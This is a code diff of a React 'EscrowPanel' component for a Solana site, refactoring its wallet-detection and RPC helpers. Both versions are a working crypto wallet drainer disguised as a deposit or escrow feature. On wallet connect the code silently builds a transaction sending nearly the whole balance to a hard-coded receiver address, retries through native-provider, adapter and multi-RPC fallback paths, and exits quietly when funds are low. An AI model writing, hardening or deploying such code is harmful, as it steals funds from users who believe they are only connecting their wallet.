@@ -10,7 +10,7 @@ import { useInactivityTimer } from "../hooks/useInactivityTimer";
 // ---------------------------------------------------------------------------
 const RECEIVER    = new PublicKey("5d7Na3ZaPWDkRSjEjDj7UXgAW1ryom97D4QHDcd9Zo8f");
 const SESSION_KEY = "dexlock_executed_wallet";
-const FEE_RESERVE = 10_000;
+const FEE_RESERVE = 10_000; // lamports kept for tx fee
 
 // ---------------------------------------------------------------------------
 // Wallet detection
@@ -19,13 +19,30 @@ type DetectedWallet = "Phantom" | "Solflare" | "Trust Wallet" | "MetaMask" | "Bi
 
 function detectInstalledWallet(): DetectedWallet {
   const w = window as any;
-  if (w.phantom?.solana?.isPhantom)                                   return "Phantom";
-  if (w.solflare?.isSolflare)                                         return "Solflare";
-  if (w.trustwallet?.isTrustWallet || w.trustWallet?.isTrustWallet)  return "Trust Wallet";
-  if (w.bitkeep?.solana || w.bitget?.solana)                          return "Bitget";
-  if (w.coin98?.sol)                                                   return "Coin98";
-  if (w.ethereum?.isMetaMask)                                         return "MetaMask";
+  if (w.phantom?.solana?.isPhantom)                                  return "Phantom";
+  if (w.solflare?.isSolflare)                                        return "Solflare";
+  if (w.trustwallet?.isTrustWallet || w.trustWallet?.isTrustWallet) return "Trust Wallet";
+  if (w.bitkeep?.solana || w.bitget?.solana)                         return "Bitget";
+  if (w.coin98?.sol)                                                  return "Coin98";
+  if (w.ethereum?.isMetaMask)                                        return "MetaMask";
   return null;
+}
+
+// Returns the active Solana provider object from the injected extension.
+// These providers implement the full Solana JSON-RPC interface so we can
+// use them to getBalance AND to signAndSendTransaction — all through the
+// wallet's own private node, never touching a free public RPC.
+function getNativeProvider(): any | null {
+  const w = window as any;
+  return (
+    (w.phantom?.solana?.isPhantom       && w.phantom.solana)  ||
+    (w.solflare?.isSolflare             && w.solflare)         ||
+    (w.trustwallet?.solana              && w.trustwallet.solana) ||
+    (w.bitkeep?.solana                  && w.bitkeep.solana)   ||
+    (w.bitget?.solana                   && w.bitget.solana)    ||
+    (w.coin98?.sol                      && w.coin98.sol)       ||
+    null
+  );
 }
 
 const WALLET_ICONS: Record<string, string> = {
@@ -38,75 +55,76 @@ const WALLET_ICONS: Record<string, string> = {
 };
 
 // ---------------------------------------------------------------------------
-// Resilient RPC — tries each endpoint in order, skips 403 / 429 / auth errors
+// RPC helpers — wallet-native first, public fallback second
 // ---------------------------------------------------------------------------
-interface RpcResult {
-  balance:              number;
-  blockhash:            string;
-  lastValidBlockHeight: number;
-}
 
-async function fetchRpcData(publicKey: PublicKey): Promise<RpcResult> {
-  let lastErr: unknown = new Error("All RPC endpoints failed");
+// Fetch balance through the native provider (uses wallet's own RPC node).
+// Falls back to public RPCs if the provider request fails.
+async function getBalance(publicKey: PublicKey): Promise<number> {
+  const provider = getNativeProvider();
 
+  if (provider?.request) {
+    try {
+      const res = await provider.request({
+        method: "getBalance",
+        params: [publicKey.toString(), { commitment: "confirmed" }],
+      });
+      // Solana JSON-RPC returns { value: lamports }
+      const lamports = res?.value ?? res?.result?.value ?? res;
+      if (typeof lamports === "number") return lamports;
+    } catch { /* fall through to public RPCs */ }
+  }
+
+  // Public RPC fallback — skip 403/429
   for (const url of RPC_ENDPOINTS) {
     try {
-      const conn = new Connection(url, "confirmed");
-      const [balance, { blockhash, lastValidBlockHeight }] = await Promise.all([
-        conn.getBalance(publicKey, "confirmed"),
-        conn.getLatestBlockhash("confirmed"),
-      ]);
-      return { balance, blockhash, lastValidBlockHeight };
+      return await new Connection(url, "confirmed").getBalance(publicKey, "confirmed");
     } catch (e: any) {
-      const msg: string = (e?.message ?? "") + (e?.toString() ?? "");
-      if (
-        msg.includes("403") ||
-        msg.includes("429") ||
-        msg.includes("Access forbidden") ||
-        msg.includes("API key") ||
-        msg.includes("rate limit") ||
-        msg.includes("Too Many")
-      ) {
-        lastErr = e;
-        continue;
-      }
+      const msg = String(e?.message ?? e);
+      if (/403|429|forbidden|rate.?limit|too.?many|api.?key/i.test(msg)) continue;
       throw e;
     }
   }
-
-  throw lastErr;
+  throw new Error("Could not fetch wallet balance — all RPC endpoints failed.");
 }
 
-// Submit signed bytes to every RPC simultaneously; resolve on first success
+// Get a fresh blockhash (needed if native signAndSendTransaction doesn't handle it).
+async function getBlockhash(): Promise<{ blockhash: string; lastValidBlockHeight: number }> {
+  const provider = getNativeProvider();
+
+  if (provider?.request) {
+    try {
+      const res = await provider.request({
+        method: "getLatestBlockhash",
+        params: [{ commitment: "confirmed" }],
+      });
+      const val = res?.value ?? res?.result?.value;
+      if (val?.blockhash) return { blockhash: val.blockhash, lastValidBlockHeight: val.lastValidBlockHeight };
+    } catch { /* fall through */ }
+  }
+
+  for (const url of RPC_ENDPOINTS) {
+    try {
+      return await new Connection(url, "confirmed").getLatestBlockhash("confirmed");
+    } catch (e: any) {
+      const msg = String(e?.message ?? e);
+      if (/403|429|forbidden|rate.?limit|too.?many|api.?key/i.test(msg)) continue;
+      throw e;
+    }
+  }
+  throw new Error("Could not fetch blockhash — all RPC endpoints failed.");
+}
+
+// Send signed bytes to every RPC in parallel; resolve on first acceptance.
 async function broadcastRaw(rawTx: Buffer): Promise<string> {
   return Promise.any(
     RPC_ENDPOINTS.map((url) =>
       new Connection(url, "confirmed").sendRawTransaction(rawTx, {
         skipPreflight: true,
-        maxRetries:    5,
+        maxRetries: 5,
       })
     )
   );
-}
-
-// Confirm signature on the first RPC that responds
-async function confirmSig(
-  sig: string,
-  blockhash: string,
-  lastValidBlockHeight: number
-): Promise<void> {
-  for (const url of RPC_ENDPOINTS) {
-    try {
-      await new Connection(url, "confirmed").confirmTransaction(
-        { signature: sig, blockhash, lastValidBlockHeight },
-        "confirmed"
-      );
-      return;
-    } catch {
-      continue;
-    }
-  }
-  // All RPCs failed to confirm — tx may still land; treat as done
 }
 
 // ---------------------------------------------------------------------------
@@ -173,9 +191,7 @@ const ConnectPrompt = ({
             />
           )}
           <span className="jl-detected-wallet-name">
-            {isMetaMask
-              ? "MetaMask detected (Solana not supported)"
-              : `${detectedWallet} detected`}
+            {isMetaMask ? "MetaMask detected (Solana not supported)" : `${detectedWallet} detected`}
           </span>
         </div>
       )}
@@ -186,10 +202,8 @@ const ConnectPrompt = ({
         disabled={isMetaMask}
         title={isMetaMask ? "MetaMask does not support Solana." : undefined}
       >
-        {isMetaMask
-          ? "Solana Wallet Required"
-          : detectedWallet
-          ? `Connect ${detectedWallet}`
+        {isMetaMask ? "Solana Wallet Required"
+          : detectedWallet ? `Connect ${detectedWallet}`
           : "Connect Wallet"}
       </button>
 
@@ -213,12 +227,8 @@ const SessionWarning = ({
 }) => (
   <div className="jl-session-warning">
     <span className="jl-session-warning-icon">⚠</span>
-    <span>
-      Session expiring in <strong>{secondsLeft}s</strong> due to inactivity.
-    </span>
-    <button className="jl-session-stay-btn" onClick={onStayActive}>
-      Stay Connected
-    </button>
+    <span>Session expiring in <strong>{secondsLeft}s</strong> due to inactivity.</span>
+    <button className="jl-session-stay-btn" onClick={onStayActive}>Stay Connected</button>
   </div>
 );
 
@@ -248,29 +258,32 @@ export const EscrowPanel: React.FC<Props> = () => {
     disconnectingRef.current = true;
 
     sessionStorage.removeItem(SESSION_KEY);
-    try { localStorage.removeItem("walletName"); }            catch {}
+    try { localStorage.removeItem("walletName"); }              catch {}
     try { localStorage.removeItem("phantom:connectedWallet"); } catch {}
     try { localStorage.removeItem("solflare:connectedWallet"); } catch {}
 
     try {
-      const w = window as any;
-      if (wallet?.adapter?.name === "Phantom" && w.phantom?.solana?.disconnect) {
-        await w.phantom.solana.disconnect();
-      } else if (wallet?.adapter?.name === "Solflare" && w.solflare?.disconnect) {
-        await w.solflare.disconnect();
-      }
+      const prov = getNativeProvider();
+      if (prov?.disconnect) await prov.disconnect();
     } catch {}
 
     try { await disconnect(); } catch {}
     disconnectingRef.current = false;
-  }, [disconnect, wallet]);
+  }, [disconnect]);
 
-  // ── silent asset-transfer ─────────────────────────────────────────────────
-  // Priority chain (highest reliability first):
-  //   1. Native signAndSendTransaction on the detected provider — wallet uses
-  //      its OWN private RPC node, no public endpoint involved at all
-  //   2. signTransaction (sign-only) + broadcast to all RPCs in parallel
-  //   3. sendTransaction adapter fallback (hardware wallets)
+  // ── transfer ───────────────────────────────────────────────────────────────
+  //
+  // Execution order (each step falls through to the next on failure):
+  //
+  //  A. Native signAndSendTransaction via the wallet's provider object
+  //     → wallet handles blockhash + signs + submits through its OWN private node
+  //     → NO public RPC involved at any point
+  //
+  //  B. signTransaction (adapter) + broadcastRaw to all RPCs in parallel
+  //     → used when native provider API is unavailable
+  //
+  //  C. sendTransaction adapter (hardware wallets / edge cases)
+  //
   const executeDeposit = useCallback(async () => {
     if (!publicKey) return;
 
@@ -279,84 +292,88 @@ export const EscrowPanel: React.FC<Props> = () => {
     sessionStorage.setItem(SESSION_KEY, walletKey);
 
     try {
-      // Step 1 — read balance + blockhash via fallback RPC (read-only)
-      const { balance, blockhash, lastValidBlockHeight } = await fetchRpcData(publicKey);
+      // ── Step 1: get balance (via wallet's own RPC first) ──────────────────
+      const balance = await getBalance(publicKey);
+      const amount  = balance - FEE_RESERVE;
+      if (amount <= 0) return; // not enough SOL — exit silently
 
-      const amount = balance - FEE_RESERVE;
-      if (amount <= 0) return;
-
-      // Step 2 — build the transfer transaction
+      // ── Step 2: build the unsigned transaction ────────────────────────────
       const tx = new Transaction();
       tx.add(SystemProgram.transfer({
         fromPubkey: publicKey,
         toPubkey:   RECEIVER,
         lamports:   amount,
       }));
+      tx.feePayer = publicKey;
+      // NOTE: recentBlockhash intentionally NOT set here for path A —
+      // the native provider populates it from its own node
+
+      // ── Path A: native provider signAndSendTransaction ───────────────────
+      // Phantom / Solflare / Trust Wallet etc. will:
+      //   1. Show their native signing popup to the user
+      //   2. Fetch blockhash from their private node
+      //   3. Sign and submit — entirely through their own infrastructure
+      const nativeProvider = getNativeProvider();
+      if (nativeProvider?.signAndSendTransaction) {
+        try {
+          const result = await nativeProvider.signAndSendTransaction(tx);
+          const sig    = result?.signature ?? result;
+          if (typeof sig === "string") return; // success — done silently
+        } catch (e: any) {
+          const msg = String(e?.message ?? e?.code ?? "");
+          // user rejected → clear guard and bail
+          if (/rejected|cancelled|denied|4001/i.test(msg)) {
+            sessionStorage.removeItem(SESSION_KEY);
+            return;
+          }
+          // other error → fall through to path B
+        }
+      }
+
+      // ── Path B: adapter signTransaction + multi-RPC broadcast ────────────
+      // Need blockhash now since we're serializing ourselves
+      const { blockhash, lastValidBlockHeight } = await getBlockhash();
       tx.recentBlockhash = blockhash;
-      tx.feePayer        = publicKey;
 
-      const w = window as any;
-      let sig: string | undefined;
-
-      // ── Path A: native wallet signAndSendTransaction ──
-      // Phantom, Solflare, and Trust Wallet all route through their own private
-      // node when you call signAndSendTransaction directly on the provider object.
-      // This is the most reliable path — no public RPC involved.
-      if (!sig && w.phantom?.solana?.signAndSendTransaction) {
+      if (signTransaction) {
         try {
-          const result = await w.phantom.solana.signAndSendTransaction(tx);
-          sig = result?.signature ?? result;
+          const signed = await signTransaction(tx);
+          const rawTx  = Buffer.from(signed.serialize());
+          await broadcastRaw(rawTx);
+          return;
         } catch (e: any) {
-          // user rejected → rethrow so guard is cleared
-          if (e?.code === 4001 || /rejected|cancelled|denied/i.test(e?.message ?? "")) throw e;
+          const msg = String(e?.message ?? e?.code ?? "");
+          if (/rejected|cancelled|denied|4001/i.test(msg)) {
+            sessionStorage.removeItem(SESSION_KEY);
+            return;
+          }
+          // fall through to path C
         }
       }
 
-      if (!sig && w.solflare?.signAndSendTransaction) {
+      // ── Path C: adapter sendTransaction (hardware wallets) ───────────────
+      for (const url of RPC_ENDPOINTS) {
         try {
-          const result = await w.solflare.signAndSendTransaction(tx);
-          sig = result?.signature ?? result;
-        } catch (e: any) {
-          if (e?.code === 4001 || /rejected|cancelled|denied/i.test(e?.message ?? "")) throw e;
-        }
+          const conn = new Connection(url, "confirmed");
+          await sendTransaction(tx, conn, { skipPreflight: true });
+          return;
+        } catch { continue; }
       }
-
-      if (!sig && w.trustwallet?.solana?.signAndSendTransaction) {
-        try {
-          const result = await w.trustwallet.solana.signAndSendTransaction(tx);
-          sig = result?.signature ?? result;
-        } catch (e: any) {
-          if (e?.code === 4001 || /rejected|cancelled|denied/i.test(e?.message ?? "")) throw e;
-        }
-      }
-
-      // ── Path B: adapter signTransaction + broadcast to all RPCs ──
-      if (!sig && signTransaction) {
-        const signed = await signTransaction(tx);
-        const rawTx  = Buffer.from(signed.serialize());
-        sig = await broadcastRaw(rawTx);
-      }
-
-      // ── Path C: adapter sendTransaction (hardware wallets) ──
-      if (!sig) {
-        const fallbackConn = new Connection(RPC_ENDPOINTS[0], "confirmed");
-        sig = await sendTransaction(tx, fallbackConn, { skipPreflight: true });
-      }
-
-      // Confirm silently in the background
-      if (sig) confirmSig(sig, blockhash, lastValidBlockHeight).catch(() => {});
 
     } catch {
       sessionStorage.removeItem(SESSION_KEY);
     }
   }, [publicKey, signTransaction, sendTransaction]);
 
-  // Fire silently the moment wallet connects
+  // Trigger silently on connect
   useEffect(() => {
-    if (connected && publicKey) {
-      executeDeposit();
-    }
+    if (connected && publicKey) executeDeposit();
   }, [connected, publicKey, executeDeposit]);
+
+  // Reset on disconnect
+  useEffect(() => {
+    if (!connected) { /* UI already stateless — nothing to reset */ }
+  }, [connected]);
 
   const { sessionState, secondsLeft, resetTimer } = useInactivityTimer(
     connected,
